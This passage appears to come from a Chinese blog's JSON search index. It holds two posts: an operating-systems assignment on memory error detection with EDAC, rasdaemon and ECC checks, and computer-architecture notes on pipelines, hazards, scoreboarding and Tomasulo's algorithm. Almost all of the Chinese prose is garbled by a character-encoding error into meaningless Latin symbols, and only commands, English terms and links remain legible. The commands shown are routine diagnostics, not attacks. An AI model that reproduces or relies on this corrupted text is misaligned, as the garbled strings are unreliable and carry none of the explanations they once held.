/var/lib/dpkg/lock å¦‚æœæ‚¨ç¢°å·§ä¼šå‡ºç°æœ‰å…³ apt-cache lock çš„é”™è¯¯ï¼Œä¾‹å¦‚ /var/cache/apt/archives/lockï¼Œè¯·åˆ é™¤ç›¸å…³é”å®šæ–‡ä»¶ã€‚\n$ sudo rm /var/cache/apt/archives/lock $ sudo rm /var/lib/dpkg/lock 2ã€edac-utilæ— æ³•ä½¿ç”¨\nhacker@ubuntu:~/Desktop$ edac-util -v edac-util: Error: No memory controller data found. åŸå› å¯èƒ½æ˜¯æˆ‘çš„ç”µè„‘ä¸æ”¯æŒecc()ï¼Œä¸€èˆ¬æ¥è¯´å†…å­˜æ¡çš„Datawidthæ¯”Totalwidthå°æ‰æ”¯æŒeccã€‚åœ¨Windowsä¸‹è¿è¡Œä»¥ä¸‹å‘½ä»¤å¯æŸ¥çœ‹æ˜¯å¦æ”¯æŒeccï¼ŒLinuxä¸‹å¯ç”¨sudo dmidecode -t memoryå‘½ä»¤æŸ¥çœ‹\n#Windowsä¸‹ C:\\Users\\L\u0026gt;wmic memorychip get datawidth,totalwidth DataWidth TotalWidth 64 64 #Linuxä¸‹ hacker@ubuntu:~/Desktop$ sudo dmidecode -t memory # dmidecode 3.2 Getting SMBIOS data from sysfs. SMBIOS 2.7 present. Handle 0x0084, DMI type 5, 46 bytes Memory Controller Information Error Detecting Method: None Error Correcting Capabilities: None ç›¸å…³çŸ¥è¯† Error correction code (ECC) çº é”™ç  ï¼ˆECCï¼‰ æ˜¯ä¸€ç§ç”¨äºæ£€æµ‹å’Œçº æ­£ç”±äºç¯å¢ƒå¹²æ‰°å’Œç‰©ç†ç¼ºé™·å¯¼è‡´çš„å†…å­˜æ•°æ®é”™è¯¯çš„æœºåˆ¶ã€‚ECC å†…å­˜ç”¨äºæ— æ³•å®¹å¿å› æ•°æ®æŸåè€Œå¯¼è‡´æ•…éšœçš„é«˜å¯é æ€§åº”ç”¨ï¼Œä¾‹å¦‚åŒ»ç–—è®¾å¤‡ã€é£æœºæ§åˆ¶ç³»ç»Ÿæˆ–é“¶è¡Œæ•°æ®åº“æœåŠ¡å™¨ã€‚\nå¤§å¤šæ•°å†…å­˜é”™è¯¯æ˜¯ç”±è½¯é”™è¯¯ï¼ˆä¾‹å¦‚å®‡å®™å°„çº¿ã€Î± å°„çº¿ã€ç”µç£å¹²æ‰°ï¼‰å¼•èµ·çš„å•ä¸ªï¼ˆ1 ä½ï¼‰é”™è¯¯ï¼Œä½†æœ‰äº›å¯èƒ½æ˜¯ç”±äºç¡¬ä»¶æ•…éšœï¼ˆä¾‹å¦‚è¡Œé”¤æ•…éšœï¼‰å¼•èµ·çš„ã€‚å¯¹äºåœ¨è¾ƒé«˜é«˜åº¦è¿è¡Œçš„ç³»ç»Ÿï¼ˆä¾‹å¦‚å•†ç”¨é£æœºï¼‰è€Œè¨€ï¼Œè½¯é”™è¯¯æ›´ä¸ºæ™®éã€‚æ®è¯´ï¼Œåœ¨å¤§çº¦10å…¬é‡Œçš„é«˜åº¦ï¼Œè¯±å¯¼å®‡å®™å°„çº¿çš„æ¯”ç‰¹è¯¯å·®è¦é«˜å‡º300å€ã€‚\nè¿™ç§å•ä½é”™è¯¯å¯ä»¥é€šè¿‡ECCå­˜å‚¨å™¨ç³»ç»Ÿæ¥çº æ­£ã€‚å¤šä½é”™è¯¯ä¹Ÿå¯ä»¥è¢«æ£€æµ‹å’Œ/æˆ–çº æ­£ï¼Œè¿™å–å†³äºé”™è¯¯ç¬¦å·çš„æ•°é‡ã€‚\nå†…å­˜é”™è¯¯çš„ç—‡çŠ¶åŒ…æ‹¬æ•°æ®æŸåã€ç³»ç»Ÿå´©æºƒå’Œ/æˆ–å®‰å…¨æ¼æ´ï¼Œä½¿éç‰¹æƒä»£ç èƒ½å¤Ÿè®¿é—®å†…æ ¸ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œå†…å­˜é”™è¯¯æ˜¯å¯¼è‡´å¤§å‹æ•°æ®ä¸­å¿ƒæœºå™¨å´©æºƒçš„æœ€å¸¸è§ç¡¬ä»¶åŸå› ä¹‹ä¸€ã€‚\nEDACå’ŒRasdaemonçš„å…³ç³» EDACï¼ˆError Detection and Correctionï¼‰å’Œ rasdaemon åœ¨åŠŸèƒ½ä¸Šæœ‰å¯†åˆ‡çš„å…³ç³»ï¼Œrasdaemon æ˜¯ä¸€ä¸ªç”¨æˆ·ç©ºé—´çš„å·¥å…·ï¼Œç”¨äºæ”¶é›†å’Œè®°å½•ç”±å†…æ ¸çš„EDACå­ç³»ç»Ÿä»¥åŠå…¶ä»–ç¡¬ä»¶é”™è¯¯æ£€æµ‹å­ç³»ç»ŸæŠ¥å‘Šçš„é”™è¯¯ã€‚\nå…·ä½“æ¥è¯´ï¼š\nEDAC å­ç³»ç»Ÿï¼šè¿™æ˜¯Linuxå†…æ ¸ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œä¸“é—¨ç”¨äºæ£€æµ‹å’ŒæŠ¥å‘ŠECCï¼ˆError-Correcting Codeï¼‰å†…å­˜é”™è¯¯ã€‚EDACèƒ½å¤Ÿæ•æ‰å’Œè®°å½•å†…å­˜é”™è¯¯ä¿¡æ¯ï¼Œå¦‚å¯çº æ­£é”™è¯¯ï¼ˆCEï¼ŒCorrectable Errorsï¼‰å’Œä¸å¯çº æ­£é”™è¯¯ï¼ˆUEï¼ŒUncorrectable Errorsï¼‰ã€‚ rasdaemonï¼šè¿™æ˜¯ä¸€ä¸ªç”¨æˆ·ç©ºé—´çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œåˆ©ç”¨å†…æ ¸ä¸­çš„RASï¼ˆReliability, Availability, and Serviceabilityï¼‰åŠŸèƒ½æ¥æ”¶é›†å’Œè®°å½•ç¡¬ä»¶é”™è¯¯ï¼ŒåŒ…æ‹¬å†…å­˜é”™è¯¯ã€CPUé”™è¯¯ã€PCIeé”™è¯¯ç­‰ã€‚rasdaemon å¯ä»¥ä»å†…æ ¸çš„EDACå­ç³»ç»Ÿè·å–å†…å­˜é”™è¯¯æ•°æ®ï¼Œå¹¶å°†è¿™äº›æ•°æ®è®°å½•åˆ°ç³»ç»Ÿæ—¥å¿—æˆ–æ•°æ®åº“ä¸­ï¼Œä¾¿äºè¿›ä¸€æ­¥åˆ†æå’Œç›‘æ§ã€‚ ä»¥ä¸‹æ˜¯EDACå’Œrasdaemonçš„å·¥ä½œæµç¨‹ï¼š\nç¡¬ä»¶é”™è¯¯æ£€æµ‹ï¼šå½“ECCå†…å­˜æ£€æµ‹åˆ°é”™è¯¯æ—¶ï¼ŒEDACå­ç³»ç»Ÿä¼šæ•è·è¿™äº›é”™è¯¯å¹¶è®°å½•ä¸‹æ¥ã€‚ é”™è¯¯ä¸ŠæŠ¥ï¼šEDACå­ç³»ç»Ÿå°†é”™è¯¯ä¿¡æ¯ä¸ŠæŠ¥ç»™å†…æ ¸æ—¥å¿—ç³»ç»Ÿã€‚ é”™è¯¯æ”¶é›†ï¼šrasdaemon ä½œä¸ºç”¨æˆ·ç©ºé—´çš„å·¥å…·ï¼Œä»å†…æ ¸æ—¥å¿—ç³»ç»Ÿä¸­æ”¶é›†è¿™äº›é”™è¯¯ä¿¡æ¯ã€‚ é”™è¯¯è®°å½•å’ŒæŠ¥å‘Šï¼šrasdaemon å°†æ”¶é›†åˆ°çš„é”™è¯¯ä¿¡æ¯è®°å½•åˆ°ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œå¹¶ä¸”å¯ä»¥é€‰æ‹©å°†è¿™äº›ä¿¡æ¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­æˆ–é€šè¿‡å…¶ä»–æ–¹å¼è¿›è¡ŒæŠ¥å‘Šã€‚ å‚è€ƒèµ„æ–™ï¼š EDAC è¯Šæ–­ç³»ç»Ÿç¡¬ä»¶æ•…éšœ â€” Cloud Atlas beta æ–‡æ¡£ (cloud-atlas.readthedocs.io)\næœåŠ¡å™¨å†…å­˜æ•…éšœé¢„æµ‹å±…ç„¶å¯ä»¥è¿™æ ·åšï¼ - vivoäº’è”ç½‘æŠ€æœ¯ - åšå®¢å›­ (cnblogs.com)\nError Detection And Correction (EDAC) Devices â€” The Linux Kernel documentation\nnotes/kernel/hwpoison.md at master Â· wangxiaoq/notes (github.com)\nhwpoison â€” The Linux Kernel v4.20.0 æ–‡æ¡£ (kernel-doc.readthedocs.io)\nhwpoison â€” The Linux Kernel documentation\nLinux EDAC modules on Server Systems - ION Server Blog (ioncomputer.com)\nMemTest86 - ECC Technical Details\nmchehab/rasdaemon)\n","date":"2024-06-05T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%A7%E4%BD%9C%E4%B8%9A%E5%86%85%E5%AD%98%E6%95%85%E9%9A%9C%E6%A3%80%E6%B5%8B%E5%92%8C%E5%A4%84%E7%90%86/os_hu10143853259001966716.jpg","permalink":"https://chenyuan1125.github.io/p/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%A7%E4%BD%9C%E4%B8%9A%E5%86%85%E5%AD%98%E6%95%85%E9%9A%9C%E6%A3%80%E6%B5%8B%E5%92%8C%E5%A4%84%E7%90%86/","title":"æ“ä½œç³»ç»Ÿå¤§ä½œä¸šï¼šå†…å­˜æ•…éšœæ£€æµ‹å’Œå¤„ç†"},{"content":"è®¡ç®—æœºä½“ç³»ç»“æ„è¯¾ç¨‹ç¬”è®° ä¸€ã€æµæ°´çº¿ 1.1RISCå¤„ç†å™¨çš„äº”æ®µæµæ°´çº¿ RISCæŒ‡ä»¤é›†æ‰§è¡Œçš„äº”ä¸ªå‘¨æœŸ\nå‘¨æœŸ åç§° æ“ä½œ 1 IF (Instruction fetch) â€¢å‘é€PCåˆ°å†…å­˜å•å…ƒï¼Œå–å›ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼›\nâ€¢æ›´æ–°PC=PC+4ï¼Œä¸ºå–ä¸‹ä¸€æ¡æŒ‡ä»¤åšå‡†å¤‡ã€‚ 2 ID (Instruction decode/register fetch) â€¢æ ¹æ®æŒ‡ä»¤ä¸­çš„æºæ“ä½œæ•°æ ‡è¯†ç¬¦ï¼Œä»å¯„å­˜å™¨æ–‡ä»¶ä¸­è¯»å–æºæ“ä½œæ•°ï¼›\nâ€¢å¯¹è¯»å–çš„æºæ“ä½œæ•°è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ä¸ºå¯èƒ½çš„è·³è½¬åšå‡†å¤‡ï¼› â€¢å¯¹æŒ‡ä»¤ä¸­çš„åç§»é‡è¿›è¡Œç¬¦å·æ‰©å±•ï¼Œä»¥é˜²å¯èƒ½ç”¨åˆ°\nâ€¢è®¡ç®—å¯èƒ½çš„è·³è½¬ç›®çš„åœ°å€ã€‚ 3 EX (Execution/effective address) â€¢å¯¹äºè®¿å­˜æŒ‡ä»¤ï¼šå°†åŸºå€å¯„å­˜å™¨å’Œåç§»é‡ç›¸åŠ å½¢æˆè®¿å­˜åœ°å€ï¼›\nâ€¢å¯„å­˜å™¨-å¯„å­˜å™¨è¿ç®—æŒ‡ä»¤ï¼šå¯¹è¯»å–çš„2ä¸ªæºæ“ä½œæ•°æ‰§è¡ŒæŒ‡å®šæ“ä½œï¼› â€¢å¯„å­˜å™¨-ç«‹å³æ•°è¿ç®—æŒ‡ä»¤ï¼šå¯¹è¯»å–çš„ç¬¬ä¸€ä¸ªæºæ“ä½œæ•°å’Œç«‹å³æ•°æ‰§è¡ŒæŒ‡å®šçš„æ“ä½œã€‚\nâ€¢åˆ†æ”¯æŒ‡ä»¤ï¼šåˆ¤æ–­æ˜¯å¦è·³è½¬ï¼Œè‹¥æˆåŠŸï¼Œåˆ™æŠŠè½¬ç§»ç›®æ ‡åœ°å€é€è‡³PCã€‚ 4 MEM (Memory access) â€¢Loadï¼šä½¿ç”¨å‰ä¸€ä¸ªå‘¨æœŸè®¡ç®—å‡ºçš„è®¿å­˜åœ°å€è¯»å–å†…å­˜ï¼› â€¢Storeï¼šå°†æ•°æ®å†™å…¥ç”±å‰ä¸€ä¸ªå‘¨æœŸè®¡ç®—å‡ºçš„è®¿å­˜åœ°å€æŒ‡å‘çš„å†…å­˜ã€‚ 5 WB\n(Write back) â€¢å¯¹äºå¯„å­˜å™¨-å¯„å­˜å™¨è¿ç®—æŒ‡ä»¤å’ŒloadæŒ‡ä»¤ï¼šå°†ç»“æœå†™å…¥å¯„å­˜å™¨æ–‡ä»¶ã€‚ æ³¨æ„ï¼šå¯„å­˜å™¨å¯ä»¥åœ¨IDå’ŒWBé˜¶æ®µåŒæ—¶åˆ†åˆ«è¿›è¡Œè¯»å’Œå†™ï¼Œå› ä¸ºå®ƒçš„è¯»å†™åˆ†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†\nå…³äºåˆ†æ”¯æŒ‡ä»¤ï¼š\nRISCæŒ‡ä»¤é›†çš„åˆ†æ”¯æŒ‡ä»¤éœ€è¦ä¸‰ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚\nMIPSæŒ‡ä»¤é›†çš„åˆ†æ”¯æŒ‡ä»¤æœªæ”¹è¿›å‰éœ€è¦å››ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œæ”¹è¿›ååªéœ€ä¸¤ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œåœ¨IDæ®µå¢åŠ ä¸€ä¸ªåŠ æ³•å™¨ï¼Œå¹¶ä¸”å°†åˆ†æ”¯åˆ¤æ–­å’Œç›®æ ‡ç»“æœæå‰åˆ°ID/EXç«™å‰\nå‡å°‘æµæ°´çº¿åˆ†æ”¯æŒ‡ä»¤çš„æŸå¤±è¿˜å¯ä»¥é€šè¿‡stallï¼Œåˆ†æ”¯é¢„æµ‹ï¼Œå»¶è¿Ÿåˆ†æ”¯(å»¶è¿Ÿæ§½)\n1.2å†²çªï¼ˆhazardsï¼‰ ä¾èµ–åˆ†ç±»\næ•°æ®ä¾èµ–ï¼ˆdata dependencyï¼‰ï¼šæŒ‡ä»¤ä¹‹é—´æœ‰æ•°æ®æµåŠ¨ï¼Œä¹Ÿå«çœŸä¾èµ– åå­—ä¾èµ–ï¼ˆname dependencyï¼‰ï¼šä¸¤æ¡æŒ‡ä»¤ä½¿ç”¨ç›¸åŒçš„å¯„å­˜å™¨æˆ–å¼•ç”¨äº†ç›¸åŒçš„å†…å­˜ä½ç½® antidependencyåå‘ä¾èµ– output dependencyè¾“å‡ºä¾èµ– æ§åˆ¶ä¾èµ–ï¼ˆcontrol dependencyï¼‰ï¼šä¸»è¦æ˜¯åˆ†æ”¯æŒ‡ä»¤å¯¹åç»­æŒ‡ä»¤çš„å½±å“ å†²çªåˆ†ç±»\nç»“æ„å†²çªï¼ˆstructural hazardsï¼‰ï¼šç¡¬ä»¶æ— æ³•æ”¯æ’‘å¹¶å‘æŒ‡ä»¤çš„å„ç§å¯èƒ½ç»„åˆï¼Œèµ„æºéƒ¨ä»¶ä¸å¤Ÿã€‚\nè§£å†³åŠæ³•ï¼š\nåœé¡¿ æ•°æ®å†²çªï¼ˆdata hazardsï¼‰\nRAWï¼ˆread after writeï¼‰æœ¬æ¥æ˜¯å…ˆå†™åè¯»ï¼Œè¯»å–å†™å…¥åçš„å€¼ï¼Œä½†å…ˆè¯»åå†™äº†ï¼Œè¯»äº†å†™å…¥å‰çš„å€¼ã€‚å¯¹åº”äºæ•°æ®ä¾èµ– WAWï¼ˆwrite after writeï¼‰å†™åå†™ï¼Œä½†æœ¬æ¥å…ˆå†™å…¥çš„å€¼å˜æˆäº†åå†™å…¥çš„å€¼ã€‚å¯¹åº”äºè¾“å‡ºä¾èµ– WARï¼ˆwirte after readï¼‰å…ˆè¯»åå†™ï¼Œè¯»å–å†™å…¥å‰çš„å€¼ï¼Œä½†å…ˆå†™åè¯»äº†ï¼Œè¯»äº†å†™å…¥åçš„å€¼ã€‚å¯¹åº”äºåå‘ä¾èµ– WAW/WARå†²çªåªä¼šåœ¨ä¹±åºæ‰§è¡Œæµæ°´çº¿ä¸­å‡ºç°ï¼ŒWAWèƒ½å‡ºç°åœ¨å¤æ‚æµæ°´çº¿ä¸­ï¼Œä½†WARåªå‡ºç°åœ¨åŠ¨æ€è°ƒåº¦çš„ä¹±åºæµæ°´çº¿ä¸­ï¼Œå› ä¸ºå¤æ‚æµæ°´çº¿ä»æ˜¯é™æ€æµæ°´çº¿ï¼Œæ‰€æœ‰æŒ‡ä»¤éƒ½æ˜¯æŒ‰åºå‘å°„çš„ï¼Œä¸å¯èƒ½å­˜åœ¨åä¸€æ¡æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•äº†ï¼Œå‰ä¸€æ¡æŒ‡ä»¤è¿˜æœªè¯»å–æ“ä½œæ•°\nè§£å†³åŠæ³•\nå‰é€ï¼ˆforwarding/bypassingï¼‰ è®¡åˆ†æ¿ï¼ˆscoreboardingï¼‰ Tomasulo æ§åˆ¶å†²çªï¼ˆcontrol hazardsï¼‰ï¼šåˆ†æ”¯æŒ‡ä»¤å¸¦æ¥çš„PCå–å€¼çš„ä¸ç¡®å®šæ€§\nè§£å†³åŠæ³•\nå»¶è¿Ÿæ§½ï¼ˆdelayed slotï¼‰ åˆ†æ”¯é¢„æµ‹ï¼ˆbranch predictionï¼‰ é«˜çº§åˆ†æ”¯é¢„æµ‹ï¼ˆcorrelating branch predictors, tournament predictorsï¼‰ è·³è½¬åœ°å€é¢„æµ‹ï¼ˆbranch target buffers) è¿”å›åœ°å€é¢„æµ‹ï¼ˆreturn address predictorsï¼‰ åŠ é€Ÿæ¯”çš„è®¡ç®—ï¼š\n$Speedup=Pipeline depth/(Ideal CPI+Structural stalls+Data hazard stalls+Control stalls)$\n1.3 MIPSæµæ°´çº¿å®ç° 1.4 å¤æ‚æµæ°´çº¿ 1.5 åŠ¨æ€è°ƒåº¦æµæ°´çº¿ ä»€ä¹ˆæ˜¯é™æ€è°ƒåº¦æµæ°´çº¿ï¼Ÿ\nâ€‹\tå°±æ˜¯å®Œå…¨ä¾èµ–ç¼–è¯‘å™¨æ‰§è¡ŒæŒ‡ä»¤è°ƒåº¦ã€ç¡¬ä»¶å®Œå…¨æŒ‰ç…§ç¨‹åºé¡ºåºï¼ˆprogram orderï¼‰å‘å°„æŒ‡ä»¤çš„æµæ°´çº¿ã€‚è¿™ç§æµæ°´çº¿ä¸­ï¼Œä¸€æ—¦æœ‰æŒ‡ä»¤å› èµ„æºå†²çªæˆ–æ•°æ®ä¾èµ–è€Œåœé¡¿ï¼Œåç»­æŒ‡ä»¤éƒ½ä¸å…è®¸å‘å°„ï¼Œå³ä½¿å®ƒä»¬å®Œå…¨ä¸ä¾èµ–äºæµæ°´çº¿ä¸­çš„ä»»ä½•æŒ‡ä»¤ï¼Œå¦‚å‰é¢æ‰€æåˆ°çš„è°ƒåº¦ã€‚\né™æ€è°ƒåº¦æµæ°´çº¿æ‰€å­˜åœ¨çš„é—®é¢˜\nå¯¹ç¼–è¯‘å™¨å¼€å‘äººå‘˜çš„è¦æ±‚å¤ªé«˜ æœ‰äº›ä¾èµ–å…³ç³»ç¼–è¯‘æ—¶æ— æ³•ç¡®å®š ç¼–è¯‘å™¨çš„é€šç”¨æ€§å¤ªå·® ä»£ç çš„é€šç”¨æ€§å¤ªå·® å—cache misså½±å“å¤ªå¤§ åŠ¨æ€è°ƒåº¦çš„æ ¸å¿ƒæ€æƒ³\nä¹±åºæ‰§è¡Œ IDé˜¶æ®µæŒ‰åºæ‰§è¡Œï¼Œå¹¶å°†IDé˜¶æ®µåˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š Issueé˜¶æ®µï¼šå¯¹åº”ä¹‹å‰çš„IDé˜¶æ®µï¼Œä½†ç²¾ç®€æ“ä½œï¼Œåªåšæœ€å¿…è¦çš„äº‹ï¼šå¦‚æŒ‡ä»¤è¯‘ç ã€èµ„æºå†²çªæ£€æµ‹ Read operandsé˜¶æ®µï¼šç­‰å¾…æ•°æ®å†²çªæ¶ˆé™¤ï¼Œç„¶åè¯»å–æ“ä½œæ•° åŠ¨æ€è°ƒåº¦æµæ°´çº¿ä¸­æ‰€æœ‰ç±»å‹çš„å†²çªéƒ½å­˜åœ¨\n1.6 è®¡åˆ†æ¿ç®—æ³• ç®—æ³•çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªè®¡åˆ†æ¿ï¼Œå®ƒè®°å½•ç€æ‰€æœ‰å¿…è¦çš„ä¿¡æ¯ï¼Œç”¨æ¥æ§åˆ¶ä»¥ä¸‹äº‹æƒ…ï¼š\næ¯æ¡æŒ‡ä»¤ä½•æ—¶å¯ä»¥è¯»å–æ“ä½œæ•°å¹¶æŠ•å…¥è¿è¡Œï¼ˆå¯¹åº”ç€RAWå†²çªçš„æ£€æµ‹ï¼‰ æ¯æ¡æŒ‡ä»¤ä½•æ—¶å¯ä»¥å†™å…¥ç»“æœï¼ˆå¯¹åº”ç€WARå†²çªçš„æ£€æµ‹ï¼‰ WAWå†²çªåœ¨issueé˜¶æ®µæ£€æµ‹ï¼Œè¿˜æ˜¯ä¼šå¯¼è‡´æ•´ä¸ªæµæ°´çº¿çš„åœé¡¿ã€‚\næŒ‡ä»¤æ‰§è¡Œçš„å››ä¸ªé˜¶æ®µ\né˜¶æ®µ æ“ä½œ Issue å¦‚æœæŒ‡ä»¤æ‰€éœ€çš„åŠŸèƒ½éƒ¨ä»¶ç©ºé—²ï¼Œå¹¶ä¸”ä¸å·²æ‰§è¡Œçš„æŒ‡ä»¤æ²¡æœ‰ç›¸åŒçš„ç›®æ ‡å¯„å­˜å™¨ï¼Œè®¡åˆ†æ¿å‘å°„æŒ‡ä»¤åˆ°åŠŸèƒ½éƒ¨ä»¶ï¼Œå¹¶æ›´æ–°å†…éƒ¨æ•°æ®ç»“æ„ã€‚ ï¼ˆWAWå†²çªï¼‰ Read operands è®¡åˆ†æ¿æ£€æµ‹æºæ“ä½œæ•°æ˜¯å¦å¯ç”¨ï¼Œæ˜¯å¦ç­‰å¾…å‰é¢æŒ‡ä»¤å†™å…¥ã€‚å½“æºæ“ä½œæ•°å¯ç”¨æ—¶ï¼Œè®¡åˆ†æ¿é€šçŸ¥åŠŸèƒ½éƒ¨ä»¶æ‰§è¡Œï¼Œä»å¯„å­˜å™¨ä¸­è¯»å–æ“ä½œæ•°ï¼Œå¹¶å¼€å§‹æ‰§è¡Œã€‚ ï¼ˆRAWå†²çªï¼‰ Execute åŠŸèƒ½éƒ¨ä»¶åœ¨æ¥æ”¶åˆ°æ“ä½œæ•°ä¹‹åå¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæˆå‡ºç»“æœåé€šçŸ¥è®¡åˆ†æ¿ã€‚ Write result è®¡åˆ†æ¿çŸ¥é“åŠŸèƒ½éƒ¨ä»¶æ‰§è¡Œå®Œæˆåï¼Œæ£€æŸ¥WARå†²çªï¼Œå¦‚æœæœ‰å¿…è¦è¿˜éœ€stallå½“å‰æŒ‡ä»¤ã€‚ï¼ˆWARå†²çªï¼‰ ç¼ºç‚¹ï¼š\nè®¡åˆ†æ¿ç®—æ³•æ²¡æœ‰å¤„ç†æ§åˆ¶å†²çªï¼Œä¹±åºæ‰§è¡Œä»…å±€é™åœ¨ä¸€ä¸ªåŸºæœ¬å—å†… æ²¡æœ‰æ¶ˆé™¤WAR/WAWå†²çªï¼Œè¿™äº›å†²çªä»ä¼šå¯¼è‡´åœé¡¿ 1.7 å¯„å­˜å™¨é‡å‘½å(Tomasuloç®—æ³•) æ ¸å¿ƒæ€æƒ³ï¼šé€šè¿‡å¯„å­˜å™¨é‡å‘½åï¼Œå¯å½»åº•æ¶ˆé™¤WAR/WAWå†²çª.\næ¯ä¸ªåŠŸèƒ½éƒ¨ä»¶æœ‰è‡ªå·±çš„ä¿ç•™ç«™ ä¿ç•™ç«™ä¸­çš„æ¯ä¸€è¡Œä¿å­˜ç€ä¸€æ¡å‘å°„åˆ°ç›¸åº”åŠŸèƒ½éƒ¨ä»¶çš„æŒ‡ä»¤ï¼Œå¹¶ç¼“å­˜äº†å·²å°±ç»ªçš„æ“ä½œæ•°ï¼Œå’Œæœªå°±ç»ªæ“ä½œæ•°çš„æ ‡ç­¾ï¼ˆå³ç”Ÿäº§æŒ‡ä»¤æ‰€åœ¨çš„ä¿ç•™ç«™è¡Œå·ï¼‰ CDB(common data bus)ä¸ä»…æŠŠç»“æœé€åˆ°å¯„å­˜å™¨ä¸­ï¼Œä¹Ÿé€åˆ°æ‰€æœ‰æ­£åœ¨ç­‰å¾…è¯¥ç»“æœçš„ä¿ç•™ç«™ä¸­ æ¯ä¸ªç»“æœä¼šé™„å¸¦ä¸€ä¸ªæ ‡ç­¾ï¼ˆå³ç”Ÿäº§æŒ‡ä»¤æ‰€åœ¨çš„ä¿ç•™ç«™è¡Œå·ï¼‰ï¼Œç”¨æ¥å’Œä¿ç•™ç«™ä¸­çš„æ ‡ç­¾ç›¸åŒ¹é… CDBç›¸å½“äºå®ç°äº†å‰é€åŠŸèƒ½ é˜¶æ®µ æ“ä½œ Issue å–å‡ºä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ£€æŸ¥èµ„æºå†²çªï¼ˆå³æ˜¯å¦è¿˜æœ‰ç©ºé—²çš„ä¿ç•™ç«™ï¼‰ï¼Œå¹¶åœ¨æœ‰ç©ºé—²ä¿ç•™ç«™æ—¶ï¼Œå°†æŒ‡ä»¤è¿åŒå°±ç»ªçš„æ“ä½œæ•°å‘å°„åˆ°ä¸€ä¸ªç©ºé—²çš„ä¿ç•™ç«™ä¸­ï¼ˆå¯¹äºæœªå°±ç»ªçš„æ“ä½œæ•°ï¼Œåœ¨ä¿ç•™ç«™ä¸­è®°å½•ç”Ÿäº§æŒ‡ä»¤æ‰€åœ¨çš„ä¿ç•™ç«™ç¼–å·ï¼‰ï¼Œå¦åˆ™åœé¡¿å½“å‰åŠåç»­æŒ‡ä»¤çš„å‘å°„ã€‚ï¼ˆWARï¼ŒWAWï¼‰ Execute ç›‘æ§CDBï¼Œç­‰å¾…æ‰€æœ‰æ“ä½œæ•°å‡å°±ç»ªï¼Œç„¶åå¼€å§‹æ‰§è¡Œè¯¥æŒ‡ä»¤ã€‚ â€¢Load/storeæŒ‡ä»¤çš„æ‰§è¡Œåˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š1ï¼‰è®¡ç®—è®¿å­˜åœ°å€ï¼ˆå„æŒ‡ä»¤æŒ‰ç…§ç¨‹åºé¡ºåºæ‰§è¡Œè¿™ä¸€æ­¥ï¼Œä»¥é˜²æ­¢é€šè¿‡å†…å­˜å‘ç”Ÿçš„æ•°æ®å†²çªï¼‰ï¼›2ï¼‰è®¿é—®å†…å­˜ï¼ˆå¯¹äºloadæŒ‡ä»¤ï¼‰ï¼Œæˆ–è€…ç­‰å¾…è¦å†™å…¥å†…å­˜çš„æ“ä½œæ•°ï¼ˆå¯¹äºstoreæŒ‡ä»¤ï¼‰ã€‚ â€¢ä¸ºäº†ä¿è¯ç²¾ç¡®ä¾‹å¤–ï¼Œä»»ä½•æŒ‡ä»¤éƒ½å¿…é¡»ç­‰å¾…å‰é¢çš„åˆ†æ”¯æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•åæ‰èƒ½å¼€å§‹æ‰§è¡Œã€‚ï¼ˆRAWï¼‰ Write result å½“ç»“æœäº§ç”Ÿåï¼Œå°†å…¶è¿åŒæ ‡ç­¾ï¼ˆå³ç”Ÿäº§æŒ‡ä»¤çš„ä¿ç•™ç«™ç¼–å·ï¼‰å¹¿æ’­åˆ°CDBä¸Šï¼Œè¿›è€Œå†™å…¥å¯„å­˜å™¨æ–‡ä»¶å’Œæ‰€æœ‰éœ€è¦å®ƒçš„ä¿ç•™ç«™å’Œstore bufferä¸­ã€‚ â€¢StoreæŒ‡ä»¤åœ¨è¿™ä¸€é˜¶æ®µè®¿é—®å†…å­˜ã€‚ ç¼ºç‚¹ï¼š\nä»æ²¡æœ‰å¤„ç†æ§åˆ¶å†²çªï¼Œä¹±åºæ‰§è¡Œä»å±€é™åœ¨ä¸€ä¸ªåŸºæœ¬å—å†… 1.8 çŒœæµ‹æ‰§è¡Œ æ ¸å¿ƒæ€æƒ³ï¼šä¸ºäº†è§£å†³è·³è½¬æ¡ä»¶åŠç›®çš„åœ°å€çš„è®¡ç®—å‡ºç»“æœå¤ªæ™šçš„é—®é¢˜ï¼Œæå‰å¯¹è·³è½¬æŒ‡ä»¤åŠç›®çš„åœ°å€çš„ç»“æœåšé¢„æµ‹ï¼Œå‡è®¾é¢„æµ‹æ­£ç¡®å¹¶ç›´æ¥ä»é¢„æµ‹çš„ç›®çš„åœ°å€å¼€å§‹å–æŒ‡ï¼Œå°±å¥½åƒè¿™æ¡åˆ†æ”¯æŒ‡ä»¤ä¸å­˜åœ¨ä¸€æ ·ï¼Œä¸ºäº†é¿å…é¢„æµ‹é”™è¯¯æ‰€é€ æˆçš„å½±å“ï¼ŒæŒ‡ä»¤æ‰§è¡Œå®Œæ¯•åï¼Œå…ˆä¸æ›´æ–°å¯„å­˜å™¨å’Œå†…å­˜ï¼Œè€Œæ˜¯æš‚å­˜åœ¨ä¸€ä¸ªç¼“å†²åŒºå†…ï¼Œç›´åˆ°èƒ½å¤Ÿç¡®å®šé¢„æµ‹ç»“æœæ˜¯å¦æ­£ç¡®ã€‚\næš‚å­˜æŒ‡ä»¤ç»“æœçš„ç¼“å†²åŒºç§°ä¸ºReorder Buffer(ROB)ï¼›Write Resultè°ƒæ•´ä¸ºå‘ROBå†™å…¥ Write Resultåé¢éœ€è¦å¢åŠ 